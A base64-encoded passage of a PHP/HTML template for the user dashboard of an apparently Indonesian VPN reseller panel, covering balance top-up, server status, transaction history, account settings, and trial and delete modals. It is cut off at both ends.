AgIDw/cGhwIGVuZGZvcmVhY2g7IGVuZGlmOz8+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPCEtLSBQQUdFOiBUT1BVUCAtLT4KICAgIDxkaXYgaWQ9InBhZ2UtdG9wdXAiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+W01PTkVZXSBJc2kgU2FsZG88L2Rpdj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPk5vbWluYWwgVG9wdXA8L2xhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0ibnVtYmVyIiBpZD0idG9wdXBBbW91bnQiIHBsYWNlaG9sZGVyPSJNaW4uIFJwIDUuMDAwIiBtaW49IjUwMDAiIHN0ZXA9IjEwMDAiPjwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPk1ldG9kZSBQZW1iYXlhcmFuPC9sYWJlbD4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idG9wdXAtbWV0aG9kcyIgaWQ9InRvcHVwTWV0aG9kcyI+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biBhY3RpdmUiIGRhdGEtbWV0aG9kPSJtYW51YWxfdHJhbnNmZXIiIG9uY2xpY2s9InNlbGVjdE1ldGhvZCh0aGlzKSI+PHNwYW4gY2xhc3M9Im0taWNvbiI+W0JBTktdPC9zcGFuPjxzcGFuIGNsYXNzPSJtLW5hbWUiPlRyYW5zZmVyIEJhbms8L3NwYW4+PC9idXR0b24+CiAgICAgICAgICAgICAgPD9waHAgaWYoZ2V0U2V0dGluZygncXJpc19pbWFnZScpKTo/PjxidXR0b24gY2xhc3M9Im1ldGhvZC1idG4iIGRhdGEtbWV0aG9kPSJxcmlzIiBvbmNsaWNrPSJzZWxlY3RNZXRob2QodGhpcykiPjxzcGFuIGNsYXNzPSJtLWljb24iPltQSE9ORV08L3NwYW4+PHNwYW4gY2xhc3M9Im0tbmFtZSI+UVJJUzwvc3Bhbj48L2J1dHRvbj48P3BocCBlbmRpZjs/PgogICAgICAgICAgICAgIDw/cGhwIGlmKGdldFNldHRpbmcoJ2RhbmFfbnVtYmVyJykpOj8+PGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biIgZGF0YS1tZXRob2Q9ImRhbmEiIG9uY2xpY2s9InNlbGVjdE1ldGhvZCh0aGlzKSI+PHNwYW4gY2xhc3M9Im0taWNvbiI+W0hFQVJUXTwvc3Bhbj48c3BhbiBjbGFzcz0ibS1uYW1lIj5EYW5hPC9zcGFuPjwvYnV0dG9uPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICAgICAgPD9waHAgaWYoZ2V0U2V0dGluZygnZ29wYXlfbnVtYmVyJykpOj8+PGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biIgZGF0YS1tZXRob2Q9ImdvcGF5IiBvbmNsaWNrPSJzZWxlY3RNZXRob2QodGhpcykiPjxzcGFuIGNsYXNzPSJtLWljb24iPlsxRjQ5QV08L3NwYW4+PHNwYW4gY2xhc3M9Im0tbmFtZSI+R29QYXk8L3NwYW4+PC9idXR0b24+PD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgICA8P3BocCBpZihnZXRTZXR0aW5nKCdzaG9wZWVfbnVtYmVyJykpOj8+PGJ1dHRvbiBjbGFzcz0ibWV0aG9kLWJ0biIgZGF0YS1tZXRob2Q9InNob3BlcGF5IiBvbmNsaWNrPSJzZWxlY3RNZXRob2QodGhpcykiPjxzcGFuIGNsYXNzPSJtLWljb24iPltIRUFSVF08L3NwYW4+PHNwYW4gY2xhc3M9Im0tbmFtZSI+U2hvcGVlUGF5PC9zcGFuPjwvYnV0dG9uPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8ZGl2IGlkPSJwYXltZW50SW5mbyIgc3R5bGU9ImJhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6MXJlbTttYXJnaW46Ljc1cmVtIDAiPgogICAgICAgICAgICA8ZGl2IGlkPSJiYW5rSW5mbyI+CiAgICAgICAgICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTouOHJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luLWJvdHRvbTouNXJlbSI+VHJhbnNmZXIga2UgcmVrZW5pbmcgYmVyaWt1dDo8L3A+CiAgICAgICAgICAgICAgPHAgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCI+PD89Z2V0U2V0dGluZygnYmFua19uYW1lJyk/PiDigJQgPD89Z2V0U2V0dGluZygnYmFua19hY2NvdW50Jyk/PjwvcD4KICAgICAgICAgICAgICA8cCBzdHlsZT0iY29sb3I6dmFyKC0tbXV0ZWQpO2ZvbnQtc2l6ZTouODc1cmVtIj5hL24gPD89Z2V0U2V0dGluZygnYmFua19ob2xkZXInKT8+PC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0iZGFuYUluZm8iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPjxwIHN0eWxlPSJmb250LXdlaWdodDo3MDAiPkRhbmE6IDw/PWdldFNldHRpbmcoJ2RhbmFfbnVtYmVyJyk/PjwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0iZ29wYXlJbmZvIiBzdHlsZT0iZGlzcGxheTpub25lIj48cCBzdHlsZT0iZm9udC13ZWlnaHQ6NzAwIj5Hb1BheTogPD89Z2V0U2V0dGluZygnZ29wYXlfbnVtYmVyJyk/PjwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0ic2hvcGVlSW5mbyIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+PHAgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCI+U2hvcGVlUGF5OiA8Pz1nZXRTZXR0aW5nKCdzaG9wZWVfbnVtYmVyJyk/PjwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBpZD0icXJpc0luZm8iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICAgICAgICAgIDw/cGhwIGlmKGdldFNldHRpbmcoJ3FyaXNfaW1hZ2UnKSk6Pz48aW1nIHNyYz0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdxcmlzX2ltYWdlJykpPz4iIHN0eWxlPSJtYXgtd2lkdGg6MjAwcHg7Ym9yZGVyLXJhZGl1czo4cHg7bWFyZ2luLXRvcDouNXJlbSI+PD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5VcGxvYWQgQnVrdGkgVHJhbnNmZXIgKG9wc2lvbmFsKTwvbGFiZWw+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBpZD0iYnVrdGlGaWxlIiBhY2NlcHQ9ImltYWdlLyoiPjwvZGl2PgogICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBzdHlsZT0id2lkdGg6MTAwJSIgb25jbGljaz0iZG9Ub3B1cCgpIj5bRVhQT1JUXSBLaXJpbSBQZXJtaW50YWFuIFRvcHVwPC9idXR0b24+CiAgICAgICAgICA8ZGl2IGlkPSJ0b3B1cFJlc3VsdCIgc3R5bGU9Im1hcmdpbi10b3A6MXJlbSI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPCEtLSBQQUdFOiBTRVJWRVIgLS0+CiAgICA8ZGl2IGlkPSJwYWdlLXNlcnZlciIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5bR0xPQkVdIFN0YXR1cyBTZXJ2ZXI8L2Rpdj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgPD9waHAgZm9yZWFjaCgkc2VydmVycyBhcyAkcyk6ICRzdD0kc1snc3RhdHVzJ107Pz4KICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4taXRlbSI+CiAgICAgICAgICAgIDxkaXY+PD89JHNbJ2ZsYWcnXT8/J/Cfh67wn4epJz8+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4taW5mbyI+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1uYW1lIj48Pz1odG1sc3BlY2lhbGNoYXJzKCRzWyduYW1hX3NlcnZlciddKT8+PC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1tZXRhIj48Pz1odG1sc3BlY2lhbGNoYXJzKCRzWydsb2thc2knXSk/PiDCtyA8Pz1odG1sc3BlY2lhbGNoYXJzKCRzWydjb2RlX3NlcnZlciddKT8+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOnJpZ2h0Ij4KICAgICAgICAgICAgICA8c3Bhbj48c3BhbiBjbGFzcz0ic2VydmVyLXN0YXR1cyBzLTw/PSRzdD8+Ij48L3NwYW4+PD89JHN0PT09J3JlYWR5Jz8nT25saW5lJzooJHN0PT09J21haW50ZW5hbmNlJz8nTWFpbnRlbmFuY2UnOidPZmZsaW5lJyk/Pjwvc3Bhbj4KICAgICAgICAgICAgICA8ZGl2IHN0eWxlPSJmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW4tdG9wOi4ycmVtIj48Pz1mb3JtYXRSdXBpYWgoJHNbJ2hhcmdhX2hhcmknXSk/Pi9oYXJpIMK3IDw/PWZvcm1hdFJ1cGlhaCgkc1snaGFyZ2FfYnVsYW4nXSk/Pi9idWxhbjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDs/PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPD9waHAgJHdhPWdldFNldHRpbmcoJ2NvbnRhY3Rfd2EnKTsgJHRnPWdldFNldHRpbmcoJ2NvbnRhY3RfdGcnKTsgJGlnPWdldFNldHRpbmcoJ2NvbnRhY3RfaWcnKTsKICAgICAgaWYoJHdhfHwkdGd8fCRpZyk6Pz4KICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPltQSE9ORV0gSHVidW5naSBBZG1pbjwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSIgc3R5bGU9ImRpc3BsYXk6ZmxleDtmbGV4LXdyYXA6d3JhcDtnYXA6Ljc1cmVtIj4KICAgICAgICAgIDw/cGhwIGlmKCR3YSk6Pz48YSBocmVmPSJodHRwczovL3dhLm1lLzw/PXByZWdfcmVwbGFjZSgnL1xELycsJycsJHdhKT8+IiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biBidG4tZ3JlZW4iPltDSEFUXSBXaGF0c0FwcDwvYT48P3BocCBlbmRpZjs/PgogICAgICAgICAgPD9waHAgaWYoJHRnKTo/PjxhIGhyZWY9Imh0dHBzOi8vdC5tZS88Pz1sdHJpbSgkdGcsJ0AnKT8+IiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+W1BMQU5FXSBUZWxlZ3JhbTwvYT48P3BocCBlbmRpZjs/PgogICAgICAgICAgPD9waHAgaWYoJGlnKTo/PjxhIGhyZWY9Imh0dHBzOi8vaW5zdGFncmFtLmNvbS88Pz1sdHJpbSgkaWcsJ0AnKT8+IiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjZTEzMDZjLCM4MzNhYjQpO2NvbG9yOiNmZmYiPltDQU1dIEluc3RhZ3JhbTwvYT48P3BocCBlbmRpZjs/PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPD9waHAgZW5kaWY7Pz4KICAgIDwvZGl2PgoKICAgIDwhLS0gUEFHRTogUklXQVlBVCAtLT4KICAgIDxkaXYgaWQ9InBhZ2Utcml3YXlhdCIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5bQ0hBUlRdIFJpd2F5YXQgVHJhbnNha3NpPC9kaXY+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgIDw/cGhwICRhbGxUcng9JGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHRyYW5zYWN0aW9ucyBXSEVSRSB1c2VyX2lkPT8gT1JERVIgQlkgY3JlYXRlZF9hdCBERVNDIExJTUlUIDUwIik7CiAgICAgICAgICAkYWxsVHJ4LT5leGVjdXRlKFskdXNlcklkXSk7ICRhbGxUcng9JGFsbFRyeC0+ZmV0Y2hBbGwoKTsKICAgICAgICAgIGlmKGVtcHR5KCRhbGxUcngpKTo/PjxkaXYgY2xhc3M9ImVtcHR5LXN0YXRlIj48ZGl2IGNsYXNzPSJpY29uIj5bQ0hBUlRdPC9kaXY+PHA+QmVsdW0gYWRhIHRyYW5zYWtzaTwvcD48L2Rpdj4KICAgICAgICAgIDw/cGhwIGVsc2U6IGZvcmVhY2goJGFsbFRyeCBhcyAkdCk6Pz4KICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1pdGVtIHRyeC08Pz0kdFsndHlwZSddPz4iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaWNvbiI+PD89JHRbJ3R5cGUnXT09PSd0b3B1cCc/J+Kshic6KCR0Wyd0eXBlJ109PT0ncmVmdW5kJz8n4oapJzon4qyHJyk/PjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaW5mbyI+PGRpdiBjbGFzcz0idHJ4LWRlc2MiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ2tldGVyYW5nYW4nXT8/dWNmaXJzdCgkdFsndHlwZSddKSk/PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1kYXRlIj48Pz1kYXRlKCdkIE0gWSwgSDppJyxzdHJ0b3RpbWUoJHRbJ2NyZWF0ZWRfYXQnXSkpPz4gwrcgPD89JHRbJ3N0YXR1cyddPz48L2Rpdj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idHJ4LWFtb3VudCIgc3R5bGU9ImNvbG9yOjw/PSR0Wyd0eXBlJ109PT0ndG9wdXAnfHwkdFsndHlwZSddPT09J3JlZnVuZCc/J3ZhcigtLWdyZWVuKSc6J3ZhcigtLXJlZCknPz4iPjw/PSR0Wyd0eXBlJ109PT0ndG9wdXAnfHwkdFsndHlwZSddPT09J3JlZnVuZCc/JysnOictJz8+PD89Zm9ybWF0UnVwaWFoKCR0WydhbW91bnQnXSk/PjwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOyBlbmRpZjs/PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICAgIDwhLS0gUEFHRTogU0VUVElORyAtLT4KICAgIDxkaXYgaWQ9InBhZ2Utc2V0dGluZyIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5bR0VBUl0gU2V0dGluZyBBa3VuPC9kaXY+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgIDxkaXYgaWQ9InNldHRpbmdBbGVydCI+PC9kaXY+CiAgICAgICAgICA8Zm9ybSBpZD0icHJvZmlsZUZvcm0iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+VXNlcm5hbWU8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycygkdXNlclsndXNlcm5hbWUnXSk/PiIgZGlzYWJsZWQgc3R5bGU9Im9wYWNpdHk6LjUiPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+RW1haWw8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgaWQ9InNldHRpbmdFbWFpbCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHVzZXJbJ2VtYWlsJ10pPz4iPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+V2hhdHNBcHAgKG9wc2lvbmFsKTwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJzZXR0aW5nV2EiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKCR1c2VyWyd3aGF0c2FwcCddPz8nJyk/PiIgcGxhY2Vob2xkZXI9IjA4eHh4eHh4eHh4eCI+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5QYXNzd29yZCBCYXJ1IChrb3NvbmdrYW4gamlrYSB0aWRhayBkaWdhbnRpKTwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0ic2V0dGluZ1Bhc3MiIHBsYWNlaG9sZGVyPSLigKLigKLigKLigKLigKLigKLigKLigKIiPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgY2xhc3M9ImxibCI+S29uZmlybWFzaSBQYXNzd29yZCBCYXJ1PC9sYWJlbD4KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJzZXR0aW5nUGFzc0NvbmZpcm0iIHBsYWNlaG9sZGVyPSLigKLigKLigKLigKLigKLigKLigKLigKIiPjwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgb25jbGljaz0ic2F2ZVByb2ZpbGUoKSI+W1NBVkVdIFNpbXBhbiBQZXJ1YmFoYW48L2J1dHRvbj4KICAgICAgICAgIDwvZm9ybT4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgPC9kaXY+PCEtLSAuY29udGVudCAtLT4KPC9kaXY+PCEtLSAubWFpbiAtLT4KCjwhLS0gTU9EQUw6IEFrdW4gRGV0YWlsIC0tPgo8ZGl2IGNsYXNzPSJtb2RhbCIgaWQ9Im1vZGFsQWt1biI+CiAgPGRpdiBjbGFzcz0ibW9kYWwtYmFja2Ryb3AiIG9uY2xpY2s9ImNsb3NlTW9kYWwoJ21vZGFsQWt1bicpIj48L2Rpdj4KICA8ZGl2IGNsYXNzPSJtb2RhbC1ib3giPgogICAgPGJ1dHRvbiBjbGFzcz0ibW9kYWwtY2xvc2UiIG9uY2xpY2s9ImNsb3NlTW9kYWwoJ21vZGFsQWt1bicpIj5bWF08L2J1dHRvbj4KICAgIDxkaXYgY2xhc3M9Im1vZGFsLXRpdGxlIj5bU0lHXSBEZXRhaWwgQWt1biBWUE48L2Rpdj4KICAgIDxkaXYgaWQ9ImFrdW5EZXRhaWxDb250ZW50Ij48L2Rpdj4KICA8L2Rpdj4KPC9kaXY+Cgo8IS0tIE1PREFMOiBUcmlhbCAtLT4KPGRpdiBjbGFzcz0ibW9kYWwiIGlkPSJtb2RhbFRyaWFsIj4KICA8ZGl2IGNsYXNzPSJtb2RhbC1iYWNrZHJvcCIgb25jbGljaz0iY2xvc2VNb2RhbCgnbW9kYWxUcmlhbCcpIj48L2Rpdj4KICA8ZGl2IGNsYXNzPSJtb2RhbC1ib3giPgogICAgPGJ1dHRvbiBjbGFzcz0ibW9kYWwtY2xvc2UiIG9uY2xpY2s9ImNsb3NlTW9kYWwoJ21vZGFsVHJpYWwnKSI+W1hdPC9idXR0b24+CiAgICA8ZGl2IGNsYXNzPSJtb2RhbC10aXRsZSI+W1BPV0VSXSBUcmlhbCBWUE4gR3JhdGlzPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1pbmZvIiBzdHlsZT0iZm9udC1zaXplOi44MnJlbSI+VHJpYWwgMSBqYW0gZ3JhdGlzLCAxeCBwZXIgaGFyaSwgcXVvdGEgMUdCLjwvZGl2PgogICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPlNlcnZlcjwvbGFiZWw+CiAgICAgIDxzZWxlY3QgaWQ9InRyaWFsU2VydmVyIj4KICAgICAgICA8P3BocCBmb3JlYWNoKCRzZXJ2ZXJzIGFzICRzKTo/PjxvcHRpb24gdmFsdWU9Ijw/PSRzWydpZCddPz4iPjw/PSRzWydmbGFnJ10/Pyfwn4eu8J+HqSc/PiA8Pz1odG1sc3BlY2lhbGNoYXJzKCRzWyduYW1hX3NlcnZlciddKT8+PC9vcHRpb24+PD9waHAgZW5kZm9yZWFjaDs/PgogICAgICA8L3NlbGVjdD48L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5Qcm90b2tvbDwvbGFiZWw+CiAgICAgIDxkaXYgY2xhc3M9InByb3RvLWdyaWQiPgogICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biBhY3RpdmUiIGRhdGEtcHJvdG89InZtZXNzIiBvbmNsaWNrPSJzZWxlY3RUcmlhbFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W1BPV0VSXTwvc3Bhbj5WTWVzczwvYnV0dG9uPgogICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1wcm90bz0idmxlc3MiIG9uY2xpY2s9InNlbGVjdFRyaWFsUHJvdG8odGhpcykiPjxzcGFuIGNsYXNzPSJpY29uIj5bRkFTVF08L3NwYW4+Vkxlc3M8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJwcm90by1idG4iIGRhdGEtcHJvdG89InRyb2phbiIgb25jbGljaz0ic2VsZWN0VHJpYWxQcm90byh0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPltTSElFTERdPC9zcGFuPlRyb2phbjwvYnV0dG9uPgogICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1wcm90bz0ic3NoIiBvbmNsaWNrPSJzZWxlY3RUcmlhbFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+W1BBRExPQ0tdPC9zcGFuPlNTSDwvYnV0dG9uPgogICAgICA8L2Rpdj48L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5Vc2VybmFtZTwvbGFiZWw+CiAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idHJpYWxVc2VybmFtZSIgcGxhY2Vob2xkZXI9IkJ1YXQgdXNlcm5hbWUgdHJpYWwiPjwvZGl2PgogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBzdHlsZT0id2lkdGg6MTAwJTttYXJnaW4tdG9wOi41cmVtIiBvbmNsaWNrPSJkb1RyaWFsKCkiPltQT1dFUl0gQW1iaWwgVHJpYWwgR3JhdGlzPC9idXR0b24+CiAgICA8ZGl2IGlkPSJ0cmlhbFJlc3VsdCIgY2xhc3M9InJlc3VsdC1ib3giPjwvZGl2PgogIDwvZGl2Pgo8L2Rpdj4KCjwhLS0gTU9EQUw6IEtvbmZpcm1hc2kgRGVsZXRlIC0tPgo8ZGl2IGNsYXNzPSJtb2RhbCIgaWQ9Im1vZGFsRGVsZXRlIj4KICA8ZGl2IGNsYXNzPSJtb2RhbC1iYWNrZHJvcCIgb25jbGljaz0iY2xvc2VNb2RhbCgnbW9kYWxEZWxldGUnKSI+PC9kaXY+CiAgPGRpdiBjbGFzcz0ibW9kYWwtYm94IiBzdHlsZT0ibWF4LXdpZHRoOjM4MHB4Ij4KICAgIDxkaXYgY2xhc3M9Im1vZGFsLXRpdGxlIj5bVFJBU0hdIEhhcHVzIEFrdW48L2Rpdj4KICAgIDxwIHN0eWxlPSJjb2xvcjp2YXIoLS1tdXRlZCk7Zm9udC1zaXplOi44NzVyZW07bWFyZ2luLWJvdHRvbToxLjI1cmVtIj5ZYWtpbiBpbmdpbiBtZW5naGFwdXMgYWt1biA8c3Ryb25nIGlkPSJkZWxldGVVc2VybmFtZSI+PC9zdHJvbmc+PyBBa3VuIGFrYW4gZGloYXB1cyBkYXJpIHNlcnZlci48L3A+CiAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOi43NXJlbSI+CiAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tb3V0bGluZSIgc3R5bGU9ImZsZXg6MSIgb25jbGljaz0iY2xvc2VNb2RhbCgnbW9kYWxEZWxldGUnKSI+QmF0YWw8L2J1dHRvbj4KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1yZWQiIHN0eWxlPSJmbGV4OjEiIG9uY2xpY2s9ImRvRGVsZXRlKCkiIGlkPSJkZWxldGVCdG4iPltUUkFTSF0gSGFwdXM8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2Pgo8L2Rpdj4KCjxzY3JpcHQ+CmxldCBjdXJyZW50UHJvdG8gPSAndm1lc3MnOwpsZXQgY3VycmVudERheXMgPSA3OwpsZXQgY3VycmVudFRyaWFsUHJvdG8gPSAndm1lc3MnOwpsZXQgZGVsZXRlQWt1bklkID0gbnVsbDsKbGV0IGRlbGV0ZUFrdW5UeXBlID0gbnVsbDsKY29uc3QgcGFnZXMgPSBbJ2hvbWUnLCdvcmRlcicsJ2FrdW4nLCd0b3B1cCcsJ3NlcnZlcicsJ3Jpd2F5YXQnLCdzZXR0aW5nJ107CmNvbnN0IHBhZ2VUaXRsZXMgPSB7aG9tZTonRGFzaGJvYXJkJyxvcmRlcjonT3JkZXIgVlBOJyxha3VuOidBa3VuIFZQTicsdG9wdXA6J0lzaSBTYWxkbycsc2VydmVyOidTdGF0dXMgU2VydmVyJyxyaXdheWF0OidSaXdheWF0JyxzZXR0aW5nOidTZXR0aW5nIEFrdW4nfTsKCmZ1bmN0aW9uIHNob3dQYWdlKHApIHsKICBwYWdlcy5mb3JFYWNoKG4gPT4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhZ2UtJytuKS5zdHlsZS5kaXNwbGF5ID0gbj09PXA/Jyc6J25vbmUnKTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFnZVRpdGxlJykudGV4dENvbnRlbnQgPSBwYWdlVGl0bGVzW3BdfHxwOwogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5uYXYtaXRlbScpLmZvckVhY2goZWwgPT4gZWwuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYWdlQWxlcnQnKS5pbm5lckhUTUwgPSAnJzsKICBpZih3aW5kb3cuaW5uZXJXaWR0aDw9NzY4KSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2lkZWJhcicpLmNsYXNzTGlzdC5yZW1vdmUoJ29wZW4nKTsKICB1cGRhdGVIYXJnYSgpOwp9CgpmdW5jdGlvbiBzZWxlY3RQcm90byhidG4pIHsKICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcjcGFnZS1vcmRlciAucHJvdG8tYnRuW2RhdGEtcHJvdG9dJykuZm9yRWFjaChiPT5iLmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpKTsKICBidG4uY2xhc3NMaXN0LmFkZCgnYWN0aXZlJyk7IGN1cnJlbnRQc